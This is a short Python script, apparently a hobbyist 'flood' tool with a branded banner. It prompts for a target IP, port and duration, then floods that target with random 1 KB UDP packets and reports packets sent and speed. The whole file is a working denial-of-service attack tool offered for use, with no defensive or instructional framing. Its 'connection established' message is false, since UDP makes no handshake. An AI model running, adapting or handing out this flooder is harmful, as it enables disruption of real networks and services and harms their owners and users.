import socket
import random
import time
import sys

# --- Color Definitions ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

def show_banner():
    print(f"{C}{B}")
    print("  _   _  _______   _____    _____ ______ _____ _    _ ")
    print(" | \ | | | ____\ \ / / _ \  |_   _|  ____/ ____| |  | |")
    print(" |  \| | | |__   \ V / | | |   | | | |__ | |    | |__| |")
    print(" | . ` | |  __|   > <| | | |   | | |  __|| |    |  __  |")
    print(" | |\  | | |____ / . \ |_| |  _| |_| |___| |____| |  | |")
    print(" |_| \_| |______/_/ \_\___/  |_____|______\_____|_|  |_|")
    print(f"{G}======================================================={W}")
    print(f"{Y}  CREATED BY:  {W}NEXO TECH")
    print(f"{Y}  INSPIRED BY: {W}DEMON ALEX && BLUEY && RESONEX")
    print(f"{G}======================================================={W}\n")

def start_flood():
    show_banner()
    
    target_ip = input(f"{Y}Target IP: {W}").strip()
    try:
        target_port = int(input(f"{Y}Target Port: {W}"))
        duration = int(input(f"{Y}Flood Duration (sec): {W}"))
    except ValueError:
        print(f"{R}[!] Error: Port/Duration must be numbers.{W}")
        return

    # Configuration
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_size = 1024 # 1KB per packet
    bytes_data = random._urandom(packet_size)
    
    print(f"\n{C}[*] Handshaking with target...{W}")
    time.sleep(1)
    
    # Timing and Counters
    start_time = time.time()
    timeout = start_time + duration
    sent = 0

    print(f"{G}[+] Connection established. Flooding started!{W}")

    try:
        while time.time() < timeout:
            client.sendto(bytes_data, (target_ip, target_port))
            sent += 1
            
            # Calculate Speed every few packets to save CPU
            if sent % 100 == 0:
                elapsed = time.time() - start_time
                # MB sent = (packets * 1024) / (1024 * 1024) which simplifies to: packets / 1024
                mb_sent = sent / 1024
                speed = mb_sent / elapsed if elapsed > 0 else 0
                
                # Update display on one line
                sys.stdout.write(f"\r{C}Packets: {sent} | {Y}Speed: {speed:.2f} MB/s{W}")
                sys.stdout.flush()
            
    except KeyboardInterrupt:
        print(f"\n{R}[!] Flood Aborted by User.{W}")
    
    # Final Stats
    total_time = time.time() - start_time
    total_mb = sent / 1024
    avg_speed = total_mb / total_time if total_time > 0 else 0
    
    print(f"\n\n{G}[SUCCESS] Finished!{W}")
    print(f"{C}Total Data: {total_mb:.2f} MB{W}")
    print(f"{C}Average Speed: {avg_speed:.2f} MB/s{W}")

if __name__ == "__main__":
    start_flood()
	
